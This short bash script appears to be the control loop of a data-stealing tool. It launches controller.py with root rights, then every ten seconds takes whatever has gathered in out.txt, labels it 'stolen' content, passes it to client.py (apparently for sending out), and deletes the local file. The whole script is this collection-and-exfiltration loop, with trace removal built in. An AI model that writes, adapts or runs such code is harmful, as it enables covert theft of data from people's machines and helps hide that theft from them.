#!/bin/bash
# used to restart the process and loop the "report"

sudo python3 controller.py &

while true
do
  if [ -s out.txt ]; then
    stolen_file=$(date +"%s.txt")
    mv out.txt "$stolen_file"
    stolen_content=$(cat "$stolen_file")
    sudo python3 client.py "$stolen_content"
    rm -f "$stolen_file"
  fi
  sleep 10
done
